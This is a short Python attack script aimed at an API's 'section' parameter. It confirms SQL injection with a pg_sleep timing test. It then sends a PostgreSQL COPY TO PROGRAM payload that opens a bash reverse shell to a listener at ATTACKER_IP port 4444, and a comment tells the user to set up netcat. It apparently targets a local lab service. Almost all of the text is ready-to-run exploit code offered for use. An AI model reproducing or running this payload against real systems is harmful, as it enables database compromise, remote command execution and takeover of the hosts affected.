import requests
import time

BASE = 'http://localhost/api/config'

# Confirm injection via timing
print('Testing timing...')
t = time.time()
requests.get(BASE, params={'section': "'; SELECT pg_sleep(3)--"})
elapsed = time.time() - t
print(f'Elapsed: {elapsed:.1f}s — injection {"confirmed" if elapsed >= 2.5 else "not confirmed"}')

# Reverse shell — change IP/port to your listener (nc -lvnp 4444)
ATTACKER_IP = '10.0.0.1'
ATTACKER_PORT = 4444
payload = f"'; COPY (SELECT 1) TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1\"'--"
print(f'\nSending reverse shell payload to {ATTACKER_IP}:{ATTACKER_PORT}...')
r = requests.get(BASE, params={'section': payload})
print('Response:', r.json())  # always {"valor": "producao"}
